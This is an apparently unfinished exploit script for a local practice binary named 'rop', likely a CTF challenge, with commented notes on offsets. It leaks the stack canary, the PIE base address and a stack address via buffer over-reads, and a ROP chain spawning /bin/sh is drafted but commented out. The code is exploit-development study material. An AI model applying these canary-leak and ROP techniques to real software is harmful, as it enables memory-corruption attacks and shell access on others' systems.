from ptrlib import *

bin_file = './rop'
elf = ELF(bin_file)
proc = Process(bin_file)

    # where canary is.
    # 0x7ffff7f2f905 <main+000c>      mov    rax, QWORD PTR fs:0x28
    # 0x00007fffffffde78│+0x0028: 0xcb59d26f0e0eef00
    # when read has called, due to read(STDIN_FILENO, msg, 0x70)
    # msg will write from $rsi(second arg of read)
    # and then, check for reads $rbp, on top of it, 
    # you can find canary same as mains.
    # so calculate $rdi - $rbp-8
    #               +0x0018 - +0x0030

    # over write last 0x00 in canary
    # for little endian, x00 at first

def leak_canary():
    paylaod = b'a' * 0x18
    paylaod += b'!'
    proc.sendafter('>> ', paylaod)
    proc.recvuntil('!')
    canary = u64(b'\x00' + proc.recv(7))
    return canary

    # becouse __libc_start_main__ call main function,
    # use .symbol function to get offset(relative) of main function.
    # when __libc_start_main__ call main function,
    # it will save the addres to go back to main function.
    # when I mean save, addres it's absolute.
    # so, plus 88f9 to base addres
    # it will be same as absolute addres of main funciton
        # objdump -M intel --disassemble=main rop
        # rop:     file format elf64-x86-64
        # Disassembly of section .init:
        # Disassembly of section .plt:
        # Disassembly of section .plt.got:
        # Disassembly of section .plt.sec:
        # Disassembly of section .text:
        # 00000000000088f9 <main>:
    # end then minus offset addres of main from base addres 
    # form absolute main addres, we can get base addres
    # addr_main:  0x72368b6708f9
    # offset_main:  0x88f9
    # base_addr: 0x72368b668000

def leak_base_address():
    proc.sendafter('>> ', b'b'*0x37 + b'!')
    proc.recvuntil('b!')
    addr_main = u64(proc.recv(6))
    offset_main = elf.symbol("main")
    base_addr = addr_main - offset_main
    return base_addr


def leak_stack_address():
    input() 
    proc.sendafter('>> ', b'c'*0x47 + b'!')
    proc.recvuntil('c!')
    addr_stack = unpack(proc.recv(6), 'all') - 0x208

def attack():
    # leak canary
    canary = leak_canary()
    print("canary: ", hex(canary))

    # leak base addr
    base_address = leak_base_address()
    print("base_address:", hex(base_address))

    # leak stack addr
    # stack_address = leak_stack_address()
    # print("stack_address: ", stack_address)

    leak_stack_address()
    # ROPチェーン構築
    # rop = ROP(binf)
    # rop.execve(addr_stack, 0, 0)  # 自動的にすべて設定
    #
    # exploit = b'/bin/sh'.ljust(0x18, b'\x00')
    # exploit += pack(canary)
    # exploit += pack(0)
    # exploit += rop.chain()

    # proc.sendafter('>> ', exploit)
    # proc.interactive()

if __name__ == '__main__':
   attack()
